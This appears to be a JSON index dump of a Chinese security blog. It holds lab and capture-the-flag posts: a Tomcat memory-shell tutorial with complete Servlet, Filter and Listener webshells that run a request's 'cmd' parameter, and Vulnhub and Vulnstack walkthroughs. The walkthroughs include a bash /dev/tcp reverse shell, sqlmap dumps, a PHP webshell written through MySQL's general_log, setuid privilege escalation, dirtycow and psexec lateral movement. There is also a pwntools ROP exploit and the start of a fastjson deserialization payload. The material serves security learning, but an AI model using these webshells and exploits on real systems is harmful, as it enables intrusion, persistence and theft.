StringRefAddr(\"a\", \"Runtime.getRuntime().exec(\\\"calc\\\")\"));ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); 参考https://mp.weixin.qq.com/s/AG0OfLfQWW-winIWiOtwLQ https://su18.org/post/rmi-attack/ http://pipinstall.cn/2021/05/31/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://xz.aliyun.com/t/7932 https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1 https://www.anquanke.com/post/id/263726 https://tttang.com/archive/1405/ https://mp.weixin.qq.com/s/gBuKDjRfnbJDv6TG5F6q3w","link":"/2022/02/16/Java_RMI攻击分析与总结/"},{"title":"Java内存马及其机制学习","text":"前言内存马之前有接触过，在阿里SRC的宙斯活动中薅了点羊毛，但当时只是会用，不了解他的原理。本文通过调试的方法了解内存马的原理，并实现常见的几种内存马。 前置知识Java Web三大组件ServletServlet是Server Applet的缩写，即服务端小程序，可以接收客户端发送的请求，并将响应数据发送回客户端。Servlet是Java Web中最常用的一种组件，就算只用到了jsp或jspx开始，实际上也用到了Servlet，因为jsp和jspx本质上是HttpServlet，而HttpServlet又是Servlet的子类。 FilterFilter可以在请求到达Servlet、响应到达客户端之前，对请求或响应做处理，因此Listener常被用来实现过滤或访问控制等。 ListenerListener是用来监听某一事件的，具体可实现统计在线用户数、访问统计等。Listener的种类很多，有ServletContextAttributeListener、ServletRequestAttributeListener、ServletRequestListener、HttpSessionIdListener和HttpSessionAttributeListener。其中ServletRequestListener是用来监听请求的，很适合实现内存马。 两种上下文与内存马相关的两种上下文是ApplicationContext和StandardContext。ApplicationContext是实现ServletContext的类，记录的是Servlet的一些上下文信息，而StandardContext记录的是包括web.xml在内的一些Web应用信息。 至于什么是Context，个人理解是与它的中文意思一样，上下文或语境，是一种小范围的环境变量，当然也因为是一个类，有相应的有方法操作这些上下文信息。 Context的获取也需要提一提，因为是后续内存马的加载依赖于StandardContext，是内存马的关键。其中常用的一种方法是通过HttpServletRequest对象的getServletContext方法获取ServletContext对象，实际上是封装了ApplicationContent的ApplicationContextFacade，而ApplicationContext又是tomcat中时实现ServletContext接口的类，然后其中有context属性，存储着StandardContext对象，可以通过反射获取。 如果没有request的话，还可以从线程中获取，详细分析可以看长亭一位师傅的文章：Tomcat的一种通用回显方法研究，除此之外还有从MBean中获取，但相对复杂一些。 web.xml加载和Tomcat启动流程调试大多数师傅的内存马分析文章都是从ApplicationContext的addServlet、addFilter和addListener方法了解Java Web三大组件的加载原理的，但本文从web.xml加载和Tomcat启动流程的角度分析内存马原理，不过实质上都是一样的，最终修改StandardCotext的内容实现的。 既然是调试，要先做些准备工作，在IDEA中新建一个Java Web项目后，还需在maven中添加个tomcat-embed-core的依赖如下，版本则设置与本地tomcat版本相同，方便下断点和调试。 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt; &lt;version&gt;8.5.71&lt;/version&gt;&lt;/dependency&gt; 由于对tomcat的源码没有研究，所以真不知道段点应该在哪里下，好在在网上找到篇文章叫Tomcat应用 web.xml的加载过程。文中提到web.xml的加载到StandardContext由org.apache.catalina.startup.ContextConfig类的configureContext方法实现。 此时在web.xml中配置三大组件如下，并在configureContext方法处下段点即可开始调试。 123456789101112131415161718192021&lt;servlet&gt; &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt; &lt;servlet-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ServletDemo&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt; &lt;url-pattern&gt;/p1ay2win&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;filter&gt; &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt; &lt;filter-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.FilterDemo&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;listener&gt; &lt;listener-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ListenerDemo&lt;/listener-class&gt;&lt;/listener&gt; 使用webxml对象，也就是web.xml解析后的内容，调用的方法名可得知，configureContext方法先后使用属性context，也就是StandardContext的实例，添加Fiter、Listener和Servlet。 123456789101112for (ServletDef servlet : webxml.getServlets().values()) { Wrapper wrapper = context.createWrapper(); ... wrapper.setName(servlet.getServletName()); ... wrapper.setServletClass(servlet.getServletClass()); ... context.addChild(wrapper);}for (Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) { context.addServletMappingDecoded(entry.getKey(), entry.getValue());} 先说说Servlet加载的流程，StandardContext实例新建一个Wrapper，然后封装进Servlet名和Servlet类名的信息，在加入为StandardContext的子容器，这里对于的是web.xml中的&lt;servlet&gt;；接着获取ServletMapping信息，加入到StandardContext的ServletMapping中，对应的是&lt;servlet-mapping&gt;。 在Filter的加载流程中，先后将FilterDef和FilterMap加入到StandardContext实例中，对应的是&lt;filter&gt;和&lt;filter-mapping&gt;。 在Listener的加载流程中，只需将filter名加入到StandardContext实例的applicationListener中。 按照上述流程，写一个Servlet的内存马是正常的，而Filter和Listener就没有生效，与ApplicationContext的addFilter和addListener方法和正常加载web.xml的StandardContext实例对比，StandardContext实例正常情况下Filter还设置了的filterConfig，而Listener还设置了applicationEventListener。 对这两个属性下断点，加载了web.xml配置后，StandardContext实例还分别调用listenerStart和filterStart方法，设置了上述两个属性，所以内存马最终也需要调用listenerStart和filterStart方法才完成Listener和Filter的加载。 再说一个尝试写内存马时候遇到的坑，一开始也像网上大多数的例子一样在方法里实现Servlet、Filter和Listener接口，并实例化；然后完全按照tomcat启动流程加载这三个组件的时候没效果，在一个报错页面中看到无法实例化的异常，在StandardContext实例确实也没看到这三个组件的实例。于是从StandardContext的stratInternal方法一步一步调，发现会使用传入的三个组件的类名进行实例化，由于是在方法里实现的三个组件的接口类，这三个组件的类属于是内部类，所以普通的反射没法实例化这三个类，导致这三个组件没法正常加载。 小结此处小结总结下三个主键的加载条件 Servlet Wrapper封装Servlet的信息 加入Wrapper到StandardContext的children中 Filter 加入到StandardContext的filterDefs 加入到StandardContext的filterMaps 加入到StandardContext的filterConfigs Listener 加入Listener对象到StandardContext的applicationEventListener中 三种内存马实现这里直接贴代码了 Servlet 12345678910111213141516171819202122232425262728293031package com.p1ay2win.JavaWebMemoryShell.exploit;import org.apache.catalina.Wrapper;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;public class ServletDemo extends HttpServlet { public ServletDemo() { WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); if (standardContext.findServletMapping(\"/p1ay2win\") == null) { Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(\"p1ay2win\"); wrapper.setServletClass(this.getClass().getName()); standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(\"/p1ay2win\", \"p1ay2win\"); } } @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { Runtime.getRuntime().exec(\"cmd /c\" + request.getParameter(\"cmd\")); }} Filter 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.p1ay2win.JavaWebMemoryShell.exploit;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap;import javax.servlet.*;import java.io.IOException;public class FilterDemo implements Filter { public FilterDemo() { WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); if (standardContext.findFilterDef(\"p1ay2win\") == null) { FilterDef filterDef = new FilterDef(); filterDef.setFilterName(\"p1ay2win\"); filterDef.setFilterClass(this.getClass().getName()); standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(\"p1ay2win\"); filterMap.addURLPattern(\"/*\"); standardContext.addFilterMap(filterMap); standardContext.filterStart(); } } @Override public void init(FilterConfig filterConfig) { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { Runtime.getRuntime().exec(\"cmd /c \" + servletRequest.getParameter(\"cmd\")); filterChain.doFilter(servletRequest, servletResponse); } @Override public void destroy() { }} Listener 1234567891011121314151617181920212223242526272829303132333435package com.p1ay2win.JavaWebMemoryShell.exploit;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import javax.servlet.ServletRequestEvent;import javax.servlet.ServletRequestListener;import java.io.IOException;import java.util.Arrays;public class ListenerDemo implements ServletRequestListener { public ListenerDemo() { WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); if (!Arrays.asList(standardContext.findApplicationListeners()).contains(this.getClass().getName())) { standardContext.addApplicationListener(this.getClass().getName()); standardContext.listenerStart(); } } @Override public void requestInitialized(ServletRequestEvent sre) { try { if (sre.getServletRequest().getParameter(\"cmd\") != null) Runtime.getRuntime().exec(sre.getServletRequest().getParameter(\"cmd\")); } catch (IOException e) { e.printStackTrace(); } } @Override public void requestDestroyed(ServletRequestEvent sre) { }} 内存马除了使用StandardContext自带的方法加载，还可使用ApplicationContext的addServlt、addFilter和addListener方法加载，但之所以很少人使用这种方法，是因为addXXX方法都有下面这段代码，检测运行状态，不允许初始化后在添加组件。 12345if (!context.getState().equals(LifecycleState.STARTING_PREP)) { throw new IllegalStateException( sm.getString(\"applicationContext.addXXX.ise\", getContextPath()));} 既然是属性，肯定是能够通过反射的方法修改它的值，然后绕过检测的，但本文因为篇幅问题就不给出实现代码了，也因为挺简单的，有兴趣的师傅可以试试。 后记这里插个题外话，跟一个安全研究的师兄聊天的时候聊到了内存马，我向他请教说为什么说是内存马，但Catalina目录下会生成内存马的.class和.java文件，不是无文件落地吗？还跟他探讨了一阵子。后来他意识到我是通过访问上传的jsp生成的内存马，而访问jsp文件时tomcat的机制是先从Catalina目录下找是否存在这个类，如果没有则会根据jsp文件生成HttpServlet类并编译，放到Catalina目录下，所以删除上传的jsp文件，Catalina目录下相应的内容也会被删除，但真正意义上的无文件还是通过反序列化实现。想想闹这出笑话也是6月份的时候了，感慨时间过得好快。😔 原本打算在文中也加上Spring内存马的内容，奈何Spring的启动流程比Tomcat复杂太多，Tomcat的调试也搞得我够呛的了，Spring的内容还是留在后续再研究吧。通过这次学习，感觉Java安全跟代码的相关性很强。加油吧，骚年 参考https://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect%EF%BC%88%EF%BC%89 https://www.freebuf.com/articles/web/274466.html https://su18.org/post/memory-shell/ https://github.com/bitterzzZZ/MemoryShellLearn https://landgrey.me/blog/12/ https://www.freebuf.com/articles/web/274466.html https://www.cnblogs.com/colin-xun/p/10573504.html https://blog.csdn.net/lblblblblzdx/article/details/80946526","link":"/2021/09/27/Java内存马及其机制学习/"},{"title":"Katana walkthrought","text":"前言武士刀这题作者自评为中级难度。确实，Web方面做着有点迷，提权方面又学到了个小trick。 https://www.vulnhub.com/entry/katana-1,482/ 利用过程照样nmap全端口扫描，开了ftp、ssh、samba和http服务。 1nmap -sV -p- -T 4 192.168.189.135 先去看看80端口的http服务，dirb扫到了个ebook目录，发现到处都是注入。 没waf直接上大杀器sqlmap，除了information_schema，还有个ebook库，里面有个admin表，记着管理员密码，其他没什么东西。 12sqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook --tablessqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook -T admin --dump 非DBA用户，sqlmap直接爆破出来管理员密码。 进到后台又添加书本功能，能上传图片，但实测不管是webshell还是正常图片，都没能成功上传。 后面看其他的端口，在8088端口发现了个upload页面。一开始用dirb什么也没扫出来，加了个-x参数扫后缀名就出来了。 1dirb http://192.168.189.135:8088/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt 上传了一个webshell测试下，发现重命名移去一个新的目录。当前端口试了下都没找到上传的webshell，看下walkthough原来是在其他端口的http服务上。 在8715端口发现了上传的webshell，在这正确要验证授权，直接用sqlmap跑出来的管理员密码admin就行了。 一句话反弹了个shell。 1system('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/192.168.189.129/4444 0&gt;&amp;1\"'); 用privilege-escalation-awesome-scripts-suite收集信息，没看见有什么能利用的点。 瞄了下，用个新trick：Capilities特权操作属性，其中CAP_SETUID属性可通过python、perl提权，CAP_DAC_READ_SEARCH可通过tar提权。 用下面的命令搜索具有Capilities特权操作属性的文件。 1getcap -r / 2&gt;/dev/null python 设置uid，再弹个shell即可提权，命令如下： 1/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'","link":"/2020/06/19/Katana_walkthough/"},{"title":"[PWN]cmcc_simplerop","text":"cmcc_simplerop Writeup https://buuoj.cn/challenges#cmcc_simplerop IDA打开附件发现主程序就是简单的栈溢出。 并且是静态链接的程序，查找system函数不存在，但发现了mprotect函数。 mprotect(const void *start, size_t len, int prot)函数能改变一个内存区的保护属性，指定的内存区间必须包含整个内存页，我做到的题目页大小通常为1K。既若要改变bss的保护属性，bss的地址为0x80eaf80，则起始地址为0x80ea000，页大小为1000，权限为7表示可读可写可执行。 现在的思路是通过mprotect改变bss的保护属性，再通过read写入shellcode，跳转到bss处执行。 以下是exp。 1234567891011121314151617181920212223242526272829from pwn import *context.log_level = 'DEBUG'context.binary = './simplerop'if sys.argv[1] == 'l': p = process('./simplerop')else: p = remote('node3.buuoj.cn',28957)elf = ELF('./simplerop')bss = elf.bss()print(hex(bss))mprotect_sym = elf.sym['mprotect']read_sym = elf.sym['read']pop3 = 0x08048913payload = flat(cyclic(32),mprotect_sym,pop3,0x80ea000,0x1000,0x7,read_sym,pop3,0x0,bss+0x50,0x50,bss+0x50)p.recvuntil(':')# gdb.attach(p)p.send(payload)sleep(1)p.send(asm(shellcraft.sh()))p.interactive() 后话当我想要在第一个send前调试的时候，每次程序都异常退出。一开始还以为是payload有错，后来去到bss查看的时候发现shellcode并么有输入全。估计是由于调试程序，发送shellcode比read读取德要快，导致没有输入全，注释掉调试就没有异常退出了。","link":"/2020/03/06/PWN-cmcc_simplerop/"},{"title":"[PWN]栈溢出-ROP学习笔记","text":"ROP简介 面向返回编程（英语：Return-Oriented Programming，缩写：ROP）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御（主要为NX， 堆栈不可执行保护）的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。 每一段gadget通常结束于return指令，并位于共享库代码中的子程序。 若程序满足可以控制返回地址和可以找到符合要求的gadgets以及gadgets地址，就进行ROP。我们选择的gadgets大多是pop register;ret;或者mov register xx;ret;之类的（我遇到的大多数情况是这样的，错了请到了打脸）对寄存器赋值。 以下例子都默认开启了栈不可执行保护 静态链接原理有的程序编译时候使用的是静态链接，所以库里所有函数的plt就有了。 例子hackme的ROP ret2text原理通过程序已有的代码构造ROP链。 例子ctf-wilki的ret2text，程序中就存在system(&quot;/bin/sh&quot;)，我们可以利用system(&quot;/bin/sh&quot;)进行getshell。 12345678910111213void secure(){ unsigned int v0; // eax int input; // [esp+18h] [ebp-10h] int secretcode; // [esp+1Ch] [ebp-Ch] v0 = time(0); srand(v0); secretcode = rand(); __isoc99_scanf((const char *)&amp;unk_8048760, &amp;input); if ( input == secretcode ) system(\"/bin/sh\");} 再看看IDA中main函数的伪代码。 1234567891011int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\"There is something amazing here, do you know anything?\"); gets(&amp;s); printf(\"Maybe I will tell you next time !\"); return 0;} gets函数没有限制输入长度，是一个典型的堆栈溢出。我们利用gdb的插件peda的功能，pattc和patts就可以计算出填充数据的大小112。而system(&quot;/bin/sh&quot;)的地址是）0x8048648。最后祭上神器pwntools。 123456789from pwn import *system_plt=0x8048648shellcode='a'*112+p32(system_olt)p.recv()p=process('./ret2text')p.sendline()p.interactive() ret2shellcode原理若程序栈不可执行，但我们可以控制其他可执行的段，如bss段（存储全局变量），那么我们就可以将shellcode写入其中，再控制程序返回地址跳转到这里执行shellcode。 例子以ctf-wiki的ret2shellcode为例。 123456789101112int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\"No system for you this time !!!\"); gets((char *)&amp;v4); strncpy(buf2, (const char *)&amp;v4, 0x64u); printf(\"bye bye ~\"); return 0;} 与前面的ret2text相似，但这里已经没有system(&quot;/bin/sh&quot;),取而代之的是strncpy。虽然strncpy不存在栈溢出漏洞，但这里的buf2是在bss段上，我们能将shellcode复制到bss段里，再控制程序跳转到bss段执行shellcode。 1234567891011#-*-coding:utf-8-*-#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2shellcode')shellcode = asm(shellcraft.sh())#shellcraft是pwntools的shellcode生成器buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))sh.interactive() ret2syscall原理syscall即系统调用，通过调用号调用系统函数。 待续。。参考资料 基本 ROP 再议 PLT 与 GOT","link":"/2019/05/25/PWN-栈溢出-ROP学习笔记/"},{"title":"Seppuku walkthrought","text":"前言这个靶机作者自评难度Intermediate到Hard，其实也不难。Web方面考的是信息收集的能力，提权方面考的可提取的点串联利用的能力。 https://www.vulnhub.com/entry/seppuku-1,484/ 利用过程nmap收集端口开启的信息，发现开启了ftp、ssh、samba和好几个的http服务。 习惯先看http的服务。80端口的http服务有nginx的基础认证，先放着。 用dirb扫7080、7601和8088上面的服务，发现7061的目录都存在目录遍历，在keys和secret目录下还有些有用的东西。 分别是ssh的私钥和passwd、shadow的备份和一个字典。先用字典尝试爆破下shadow，shadow最后一个用户的rabbit的a用的是@，跟前面的passwd不一样，于是把他改回来。 用unshadow吧passwd和shadow转为john可以识别的格式，并用john按信息收集到的密码字典进行爆破。 12unshadow passwd.bak shadow.bak &gt; passwd.johnjohn -w=password.lst passwd.john ssh没成功连上，估计就是作者挖的一个坑。接着又用hydra爆破用户seppuku的口令，用信息收集的密码字典成功爆破出来。 依旧用privilege-escalation-awesome-scripts-suite信息收集，看到sudo -l项有个软连接root到tmp的命令，已存在tmp目录，好像没什么用。 但在home目录下发现了个属于root的文件.passwd，文件名和内容看起来像密码。 试了下能登录到samurai，再一次收集信息，sudo -l又有新的东西。 但是tanto的home目录下没有.cgi_bin目录，更没有bin可执行文件。不过在他的.ssh目录下发现了个ssh公钥，马上想到了之前web信息收集到的ssh私钥，ssh成功连上。 到home建个.cgi_bin目录，并输入/bin/bash。 切回seppuku用户，sudo那条命令，成功提取。","link":"/2020/06/20/Seppuku_walkthrough/"},{"title":"Sumo walkthrought","text":"前言这也是一个很简单的靶机，用到的知识点是CVE-2014-6278的bash命令注入和dirtycow提权。 https://www.vulnhub.com/entry/sumo-1,480/ 利用过程拿到手肯定是要信息收集一波，nmap扫到只开放了22端口和80端口。 80端口进去是默认页面，目录扫出了cgi-bin和server-status目录，状态码都是403。 再用nikto扫下，扫出来了CVE-2014-6278和CVE-2014-6271，是bash命令注入的漏洞，msf里已有exp。 进msf选中利用模块，设置好参数，攻击后正常返回一个meterpreter session。 启动一个shell之后，运行whoami命令和uname -a命令。当前用户是www-data，并且发现内核版本较低，可用dirtycow提权。 使用github上的exp https://github.com/FireFart/dirtycow 上传到靶机，并用以下命令编译运行 12gcc dirty.c -o dirty lpthread./dirty &lt;new_password&gt; 命令执行后要等一段时间，成功后会创建名为firefart的root用户，密码为运行命令时输入的密码。 ssh登录上去，在/root目录即可获得flag。","link":"/2020/06/12/Sumo-walkthrough/"},{"title":"Tre1 walkthrought","text":"前言这个靶机Web部分设计得非常real，提权部分几步走实现提权，主要考的信息收集。总体来说不错得一个靶机。 https://www.vulnhub.com/entry/tre-1,483/ 利用过程nmap开扫，发现开了ssh和80、8082两个端口得http服务。 80和8082端口同时用dirb开扫目录。8082端口除了index.html，并没有发现什么。 80端口下却有不少东西，根路径下数据库连接测试的页面和phpinfo页面。 1dirb http://192.168.189.137/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt mantisbt目录下还有个漏洞报告的系统。 adminer.php页面尝试弱口令和Mysql客户端文件读取无果。 继续后面的mantisbt目录，发现mantisbt的子目录基本都能目录遍历，在config目录下找到了两个有用的文件：a.txt和data.sql，应该是作者留下了的线索。 a.txt里记录着数据库密码，刚好在adminer能派上用场。 data.sql文件里都是创建数据库的SQL语句，但里面有条插入到mantis_user_table表的操作就明显不寻常。password字段的MD5拿去cmd5匹配得出为root 用a.txt里获取到的数据库密码成功登录进了adminer，首先想到的是into outfile写webshell，然而没权限。 1select &apos;&lt;?php eval($_GET[cmd]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;; 将password字段的MD5替换为root的MD5，登录进漏洞报告系统。 看见是比较新的版本，毕竟是漏洞报告系统，估计也没什么漏洞。 这时留意到用户表tre的realname不同寻常，看者有点像密码。试下ssh登录，果然就进去了。 上传privilege-escalation-awesome-scripts-suite的脚本收集信息，注意到/usr/bin/目录下的check-system可执行文件可写，并且root用户在运行这个命令。命令内容如下，死循环echo。。。 12345678DATE=`date '+%Y-%m-%d %H:%M:%S'`echo \"Service started at ${DATE}\" | systemd-cat -p infowhile :doecho \"Checking...\";sleep 1;done 一开始以为是在定时任务里用到这个命令，然而并没有，仔细找了找发现在/etc/systemd/system/里注册成了服务。 这个目录下的服务会开机启动，sudo -l刚好看见shutdown命令能免密码sudo。 开始想是反弹shell，结果没成功，于是用给find命令赋SUID属性的方提权。 1chmod u+s /usr/bin/find 用man看了下shutdown的使用方法，-r参数能够重启靶机，于是乎… 1sudo /sbin/shutdown -r 0 待重启完重新连上ssh后，find提权老操作。 1find . -exec /bin/bash -p \\;","link":"/2020/06/20/Tre1_walkthrough/"},{"title":"[域渗透]Vulnstack1_walkthrough","text":"前言最近想找找非IIS中间件的windows实战来搞搞，但是暂时没找到，不过无意中看到红日安全做的，练习域渗透的windows靶机：vulnstack，感觉不错。 环境搭建按照红日安全公众号的文章，先在vmware的虚拟网络编辑器的添加两个仅主机的虚拟网络，网段分别为192.168.52.0和192.168.72.0。 Windows 7 x64再添加多一个网卡，分别连上VMnet1和VMnet2；Win2k3 Metasploiteable和Windows Server 2008 R2 x64连上VMnet1；最后攻击者主机最后连上VMnet2。 最后的最后还需要用密码hongrisec@2019登录到Windows 7 x64，在C:\\phpStudy目录里，手动启动phpStudy。 利用过程信息收集nmap扫了下发现开启了80和3306端口，phpStudy的mysql用户名和默认密码都为root，估计都没改，直接能在外网连上mysql。 http服务打开是一个phpStudy的探针，泄露了web目录的绝对路径。 扫目录就扫出来个phpmyAdmin和phpinfo。 打点phpmyAdmin用众所周知的用户和密码root，就能登录进去。phpStudy的mysql也是高权限运行的，写文件getshell应该没什么问题。 into outfile在这里用不了，用下面的payload一次性写好shell。 1234set global general_log = &apos;ON&apos;;set global general_log_file = &apos;C:/phpStudy/WWW/cmd.php &apos;;select &apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&apos;;set global general_log = &apos;OFF&apos;; 蚁剑连上去发现还有备份和一个cms，字典小没有扫到，cms这个方向应该也能getshell，但这里先按下不表。 横向移动在蚁剑的模拟终端看了下，没有杀软，可以直接powershell无文件上线。 也因为是phpStudy，所以webshell也直接是高权限，提权都省了。看了下存在域，当前账号就是域管理员，域内主机有三台。 12net group \"domain admins\" /domainnet group \"domain computers\" /domain 有了域管理员账号，讲道理直接横向移动就行，但这里内网主机不出网，还要做点前置操作。对比了几种方法，觉得smb管道正向连接比较简便。 在监听列表添加一个SMB的Beacon。 选择当前session，派生到SMB Beacon。 psexec横向移动监听选smb，session选派生出来的session。 接着等一小会就能上线了，命令能正常执行。 当然除了用域管理员横向移动，MS17-010也很可能能打得到。CS上的MS17-010说实话确实不好用，所以先派生个session到msf上，用autorouter做好路由后，用auxiliary/admin/smb/ms17_010_command模块，不出所料就打到了。其他模块打不动，有时候甚至回重启，也就算了。","link":"/2020/10/13/[域渗透]Vulnstack1_walkthrough/"},{"title":"[域渗透]Vulnstack2_walkthrough","text":"前言For some reason,I can’t explain.靶机下完好几天了，现在才写walkthrough，主要是太菜了，到现在还没人捞。。。vulnstack2比vulnstack1复杂一点点，但也不难，不过也是设计得不错得一个靶机。感谢红日安全和de1ay师傅提供的靶机。 环境搭建这次也跟vulnstack1一样，划分了两个虚拟网络。子网地址分别为192.168.111.0和10.10.10.0。 WEB.de1ay.com的两张万卡分别连上VMnet1和VMnet2 PC.de1ay.com也是连上VMnet1和VMnet2 DC.de1ay.com则只需要连上VMnet2 攻击者主机连上VMnet 最后需要使用账号de1ay\\administrator和密码1qaz登录到WEB.de1ay.com，进入到C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin目录，双击startWebLogic批处理脚本，启动WebLogic。 漏洞利用信息收集WEB.de1ay.com这台主机开放了很多端口，其中80、1433、3389和7001就比较有用，这里7001就是WebLogic的默认端口。另一台主机暂时可能就3389端口比较有用。 WEB.de1ay.com的80端口进去就是空白页面，扫目录页没有扫到扫东西。 7001端口直接在浏览器上打开就看到明显是WebLogic的404页面，输入路径/console/login/LoginForm.jsp就能WebLogic的登录界面。 打点既然由WebLogic，那就顺理成章地拿WeblogicScan扫了下，存在CVE-2019-2725。 刚好msf里有这个洞的利用脚本，直接一把梭getshell。注意这里target默认是unix，用命令set target 1就可以把target设置为Windows。 最后run就会返回个meterpeter的session，没什么难度。 BypassUAC个人横向移动更喜欢用cobaltstrike，所以用msf的payload_inject把session派生到cobaltstrike。 在cs上看到session的用户是administrator，准备收集域信息时，遇到了拒绝访问，一开始还以为是360的锅，但在WEB的虚拟机上，看360不为所动。查下资料得知是UAC的问题，用cs4.0提权模块里的svc-exe即可绕过UAC。 好奇这个svc-exe是什么原理，又搜了下质料得到这样的解释：psexec打自己。 信息收集绕过UAC后，顺利收集到了域信息，当前用户就是域管理员，域控在里一台机子。 mimikatz读了一波密码，顺便翻了翻主机上的文件，感觉没什么敏感信息。ipconfig看了下又两个网段，10.10.10.1/24的就是内网网段。arp扫描下内网，有一个域控，另一个就是域成员主机。 横向移动administrator是域管理员，使用administartor的凭证横向移动就行了，但这里遇到个坑，没绕过UAC之前横向移动都失败了，我还以为是设置了某些策略的问题。。。 使用cs的psexec进行横向移动，Session则选择SYSTEM权限的session。在内网不出网情况下，上线DC只需要像上回那样用smb的Listener即可。 PC的上线操作也差不多，现在所有的主机都上了线了。 顺便说下DC.de1ay.com还存在MS17-010，但是用msf的命令执行的payload打一次，session就断一次，太难受了。 还有最近那个Zerologon也是可以的，毕竟是最新的洞，但那socks代理死活连不上内网/捂脸。只好把网卡直接接到内网。","link":"/2020/10/20/[域渗透]Vulnstack2_walkthrough/"},{"title":"fastjson不出网利用简析","text":"前言又来炒冷饭啦，做项目终于遇到个fastjson反序列化，但又不想贡献自己的VPS出来搭个JNDI，于是网上找个POC试了下。Duang的一下竟然成功了，执行命令还有回显，有点意思啊，于是开始炒冷饭了。 利用前提既然是不出网，许多POC中利用JNDI远程加载外部类的方法就无法使用了，不出网的利用需要无需加载类或可通过类属性加载。另一个前提就是获取命令的执行结果，可以将结果写入到web目录，访问该文件获取结果，但更优雅的方式是获取response，将结果从响应信息中输出。 远程加载类目前公开且较为通用的不出网利用链有两条。 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl org.apache.tomcat.dbcp.dbcp2.BasicDataSource TemplatesImpl上一篇文章已经分析过了，反序序列化方法中feature参数需要设置为允许给非公有属性赋值，与BasicDataSource相比就有些鸡肋了。BasicDataSource只需要有dbcp或tomcat-dbcp的依赖即可，dbcp即数据库连接池，在java中用于管理数据库连接，还是挺常见的。 以下是一个加载恶意类，而恶意类静态代码中有写了Runtime弹计算器的POC，老样子在exec方法处下断点，发现调用栈还是比较钱的，可以从开头开始分析。 1234567891011121314151617181920package com.p1ay2win.fastjson;import com.alibaba.fastjson.JSON;public class BCEL { public static void main(String[] args){ String payload2 = \"{\\n\" + \" {\\n\" + \" \\\"x\\\":{\\n\" + \" \\\"@type\\\": \\\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\\",\\n\" + \" \\\"driverClassLoader\\\": {\\n\" + \" \\\"@type\\\": \\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"\\n\" + \" },\\n\" + \" \\\"driverClassName\\\": 